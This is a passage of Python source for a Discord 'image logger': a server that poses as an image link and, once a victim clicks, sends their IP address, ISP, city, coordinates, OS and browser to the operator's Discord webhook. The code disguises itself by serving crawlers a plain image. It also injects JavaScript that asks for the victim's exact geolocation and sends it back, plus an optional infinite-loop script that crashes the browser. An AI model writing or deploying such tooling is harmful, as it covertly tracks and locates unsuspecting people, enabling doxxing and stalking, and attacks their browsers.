> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
